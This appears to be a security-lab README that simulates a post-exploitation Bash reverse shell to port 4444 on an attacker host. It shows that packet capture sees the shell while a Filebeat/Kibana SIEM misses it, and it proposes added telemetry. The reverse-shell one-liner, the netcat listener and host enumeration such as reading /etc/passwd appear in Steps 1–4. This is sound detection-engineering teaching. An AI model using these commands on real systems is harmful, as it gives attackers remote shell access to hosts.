<p align="center">
  <img src="GhostShell.jpeg" alt="GhostShell" width="400">
</p>
# GhostShell

 Reverse Shell / C2 Simulation and the Limits of Log-Based Detection

---

 ## Objective

 The objective of this lab is to simulate a post-exploitation reverse shell connection — the stage after an attacker has already gained code execution on a victim host — and evaluate what network-layer (PCAP) versus host-log-based (SIEM) monitoring each can and cannot see.

 Unlike the SSH brute-force and SQL injection labs in my repository, this attack generates **outbound traffic from the victim** and deliberately tests the current SIEM setup's blind spots rather than its detection strength.

 The main purpose of this lab is to show that malicious activity can be clearly visible in a packet capture while remaining completely invisible to a SIEM when the required host telemetry is not being collected.

---

 ## Environment

 | Role | Hostname | Tool Stack |
| --- | --- | --- |
| Attacker | `h4cker_fawad-attacker-kali` | Kali Linux, Netcat listener |
| Victim | `h4cker_fawad-analyst` | Ubuntu Server, Bash, tcpdump |
| SIEM | `h4cker_fawad-sensor` | Ubuntu Server, Elasticsearch, Kibana, Filebeat |

The SIEM configuration used in this lab is the same logging setup used in the previous labs. This is important because the purpose of this exercise is to test the existing monitoring configuration rather than introduce new telemetry before testing.

---

 ## Attack Simulation

 **Scenario:** Simulating the moment after an attacker has already achieved code execution on the victim via a web shell dropped through the earlier SQL injection finding, as part of a realistic attack chain.

 At this stage, the attacker establishes a live interactive command channel from the compromised victim back to the attacker's Kali machine.

 The connection used in this lab is a Bash reverse shell over TCP/4444.

---

 ### Step 1 — Listener on Kali (attacker side)

 On `h4cker_fawad-attacker-kali`, Netcat was started and configured to listen on TCP port `4444`:

```
nc -lvnp 4444
```
![Step 1 port listening](port-listening.jpeg)
---

---

 ### Step 2 — Packet capture started on the victim

 Before triggering the shell, packet capture was started on `h4cker_fawad-analyst`.

 The capture was saved locally so that the complete connection could be analyzed later in Wireshark:

```
sudo tcpdump -i ens33 -w /home/h4cker_fawad/lab3_ghostshell_capture.pcap

```
![step2-packet-capture-wireshark.png](port-capturing.jpeg)
---

---

 ### Step 3 — GhostShell connection triggered on the victim

 The reverse shell was then triggered on `h4cker_fawad-analyst`:

```
bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
```
![ Reverse shell triggered ](remote-access.jpeg)
---
 This causes Bash to create an outbound TCP connection to the Kali listener.

 Once the connection is established, the attacker can interact with the Bash process through the Netcat listener.

---

---

 ### Step 4 — Post-exploitation commands run through the shell

 After the connection was established, basic host-enumeration commands were executed through the GhostShell session:

```
whoami
id
pwd
hostname
cat /etc/passwd
ls -la /home
```
![Step 4 — Post-exploitation commands run from Kali, through the shell](post-exploitation-access.jpeg)

---
 These commands were used to confirm that the connection provided interactive command execution on the victim.

---

---

 ### Step 5 — Capture stopped and shell closed

 Once command execution was confirmed, the packet capture was stopped and the GhostShell connection was closed.

 The resulting PCAP was then opened in Wireshark for network-level analysis.

---

 ## Detection — Network Layer (Wireshark)

 The captured traffic was opened in Wireshark and filtered to the TCP port used by the GhostShell connection:

```
tcp.port == 4444
```
![wireshark  pcap filtered](pcap-analysis.jpeg)
---

---

 ### Findings

 A full TCP handshake was visible in the capture:

```
SYN → SYN-ACK → ACK
```

 The important part of this connection was its direction.

 The TCP connection was initiated by:

```
192.168.142.138 → 192.168.142.139:4444
```

 In this lab:

```
192.168.142.138 = h4cker_fawad-analyst
192.168.142.139 = h4cker_fawad-attacker-kali
```

 The compromised host therefore initiated an **outbound TCP connection** to the attacker's listener.

 This direction is an important piece of evidence during investigation. It is different from a normal scenario where an external client connects to a service that the victim is intentionally exposing.

 Connection direction by itself is not enough to classify traffic as malicious. However, an unexpected outbound connection combined with an unusual destination, unusual port, long-lived session, and interactive traffic provides useful investigation context.

---

 ### TCP Conversation Analysis

 Wireshark's:

 **Statistics → Conversations → TCP**

 was also checked.

 The GhostShell connection remained open for the duration of the interactive command sequence.

 This is different from the connection behavior observed in my Hydra lab, where the attack generates many short-lived authentication attempts.

 The GhostShell connection instead behaves like a persistent interactive session.

 The important characteristics observed were:

 - Victim initiated the connection.
- Destination was the attacker-controlled host.
- Destination port was `4444`.
- The TCP session remained open while commands were executed.
- Data was exchanged interactively during the session.

---

 ### Following the TCP Stream

 The connection was then examined using:

 **Right-click → Follow → TCP Stream**

 Because the simulated GhostShell traffic was not encrypted, the commands sent through the connection and their output were visible directly in the TCP stream.

 For example, commands such as:

```
whoami
id
pwd
hostname
```

 could be observed along with their corresponding output.

 This provided direct network-level evidence that the connection was not simply a TCP connection attempt.

 It was being used as an interactive command channel.

---

 ## Detection — Host/SIEM Layer (Kibana)

 After completing the network analysis, the existing Filebeat data was checked in Kibana.

 The purpose was to determine whether the same activity generated any events in the current SIEM pipeline.

 The following searches were used:

```
message: "4444"
```

---

```
message: "nc"
```

---

```
message: "bash"
```
![Kibana response](kibana-output.jpeg)
---

 **Result: no relevant matches returned.**

 This was expected and is the central finding of this particular lab rather than a failure of the SIEM setup.

 The current Filebeat configuration ships only the following log sources:

 - `/var/log/auth.log`
- `/var/log/syslog`
- Apache access logs
- Apache error logs

 The GhostShell connection does not require SSH authentication.

 It does not require Apache to process a request.

 It also does not, by default, write the relevant process execution or outbound network connection information into the log files currently being collected.

 Because of this, the SIEM has no useful event describing the GhostShell activity.

 The activity is therefore:

```
Network layer  →  Visible
Current SIEM   →  Not visible
```

 This is the main detection gap demonstrated by this lab.

---

 ## Why the SIEM Did Not See the GhostShell

 The important distinction here is between **activity happening on the system** and **activity being logged**.

 The following events occurred on the victim:

```
Bash process
    ↓
Reverse shell
    ↓
Outbound TCP connection
    ↓
Attacker listener
    ↓
Interactive commands
```

 However, the current logging configuration does not collect the required process and network telemetry.

 Filebeat is only forwarding selected log files.

 Therefore, even though the activity happened successfully, Elasticsearch never received an event describing the relevant process execution or TCP connection.

 Kibana can only search the data that Elasticsearch has received.

 This means the absence of a Kibana event should not be interpreted as evidence that the activity did not occur.

 In this case, it demonstrates a **logging coverage gap**.

---

 ## IOC Table

 | IOC Type | Value | Context |
| --- | --- | --- |
| Destination IP | `192.168.142.139` | C2/listener endpoint |
| Source IP | `192.168.142.138` | Compromised host initiating outbound connection |
| Port | `4444/TCP` | Non-standard port used for the GhostShell listener |
| Direction | Outbound, victim → attacker | Key characteristic of the simulated GhostShell connection |
| Connection behavior | Long-lived, interactive | Consistent with a live shell session |
| Protocol | TCP | Transport used by the simulated connection |
| Detection source | Wireshark / PCAP | Network-level evidence |
| SIEM visibility | None | No corresponding event in the current Filebeat data sources |

The IP addresses and port listed above are specific to this isolated lab environment and should not be treated as malicious indicators outside this context.

---

 ## Triage Note

```
Alert: GhostShell / C2 Connection Identified (via manual PCAP review — no automated alert exists for this)
Host: h4cker_fawad-analyst (Ubuntu-Victim)
Destination IP: 192.168.142.139
Port: 4444
Timestamp: 2026-09-15 04:47
Detection Source: Network capture only (Wireshark) — NOT visible in SIEM/Kibana
Verdict: True Positive (simulated)
Severity: Critical
Next Steps:
  - Isolate the host from the network immediately
  - Terminate the GhostShell process
  - Investigate possible persistence mechanisms
  - Review what allowed the initial code execution
  - In this simulated attack chain, review the earlier SQL injection finding
  - Preserve relevant forensic evidence
  - Close the detection gap by collecting process and network telemetry
```

---

 ## Timeline

 > At `2026-09-15 04:47`, host `h4cker_fawad-analyst` initiated an outbound TCP connection to `h4cker_fawad-attacker-kali` on port `4444`, consistent with the simulated GhostShell/reverse-shell activity.
>
>  The connection remained open for the duration of the interactive command sequence. Commands including `whoami`, `id`, `pwd`, `hostname`, and file-enumeration commands were executed through the connection.
>
>  Because the simulated connection was unencrypted, the commands and their output were visible in plaintext through the packet capture.
>
>  No corresponding evidence of the activity was found in Kibana/Elasticsearch because the current Filebeat configuration does not collect the required host-level process or network telemetry.

---

 ## The Fix

 Closing this detection gap requires additional telemetry.

 There are two main approaches.

 ### 1\. Host-based process monitoring

 Host-based monitoring can provide visibility into the process responsible for creating the connection.

 Possible approaches include:

 - `auditd`
- Sysmon for Linux
- EDR/endpoint telemetry
- Process creation monitoring
- Parent/child process monitoring
- Command-line logging
- Process-to-network connection monitoring

 For example, endpoint telemetry could provide information about:

```
Parent Process
      ↓
Bash
      ↓
Network Connection
      ↓
192.168.142.139:4444
```

 This is information that cannot be reliably obtained from the current `auth.log`, `syslog`, and Apache logs.

 The additional endpoint telemetry should then be forwarded into the same SIEM pipeline so that it can be searched and correlated in Elasticsearch/Kibana.

---

 ### 2\. Network-level detection

 Network-level monitoring can provide visibility even when the endpoint does not generate useful application logs.

 Possible technologies include:

 - Suricata
- Zeek
- Firewall logs
- Network-flow telemetry
- Network Security Monitoring (NSM)

 A network detection system could identify combinations such as:

```
Internal Host
    +
Unexpected Destination
    +
Unusual Destination Port
    +
Long-Lived TCP Connection
    +
Interactive / Suspicious Traffic
```

 A connection to TCP/4444 alone should not automatically be considered malicious because non-standard ports can be legitimate.

 The value comes from combining multiple indicators and investigating them in context.

---

 ## Key Takeaway

 The main lesson from this lab is that **a SIEM can only detect what its telemetry sources actually record**.

 The GhostShell connection was clearly visible at the network layer.

 Wireshark provided evidence of:

 - The source IP.
- The destination IP.
- The destination port.
- The outbound connection direction.
- The TCP handshake.
- The connection duration.
- The interactive nature of the session.
- The plaintext commands and command output.

 However, the same activity was not visible in Kibana because the current Filebeat configuration does not collect the process and network telemetry required to identify it.

 This creates a clear detection gap:

```
Attack Activity
      ↓
Network traffic
      ↓
PCAP
      ↓
VISIBLE

Attack Activity
      ↓
Process / network telemetry
      ↓
Current Filebeat sources
      ↓
NOT COLLECTED
      ↓
NOT VISIBLE IN SIEM
```

 The important point is that this was not a failure of Wireshark, Elasticsearch, or Kibana.

 The limitation was the **telemetry being collected from the victim**.

---

 ## Tools Used

 - Kali Linux
- Netcat (`nc`)
- Bash
- Bash `/dev/tcp`
- `tcpdump`
- Wireshark
- Elasticsearch
- Kibana
- Filebeat

---

 ## Conclusion

 This lab demonstrated the difference between **network-layer visibility and host-log-based SIEM visibility** during a simulated post-exploitation GhostShell connection.

 At the network layer, the activity was clearly visible.

 The victim initiated an outbound TCP connection to the attacker's listener on port `4444`. The connection remained open during the interactive command sequence, and because the traffic was unencrypted, the commands and their output could be observed directly through the TCP stream.

 At the SIEM layer, however, no relevant activity was found.

 The existing Filebeat configuration monitors authentication, syslog, and Apache logs, but does not collect the endpoint process or network telemetry required to expose this type of activity.

 The result is a clear monitoring blind spot:

 > **The attack happened, the network captured it, but the current SIEM did not have the telemetry required to see it.**

 Closing this gap requires additional endpoint process monitoring, network-level monitoring, or preferably both.

 This lab therefore demonstrates an important SOC detection-engineering lesson: detection is not only about writing rules. Before a detection rule can work, the required telemetry must exist and be available to the SIEM.

---

 ## Repository Structure

 

```
GhostShell/
├── README.md
├── step1-port-listening.png
├── step2-packet-capture-wireshark.png
├── step3-reverse-shell-triggered.png
├── step4-post-exploitation-commands.png
├── step5-pcap-filtered.png
└── kibana-response.png
```



Everything will be possible
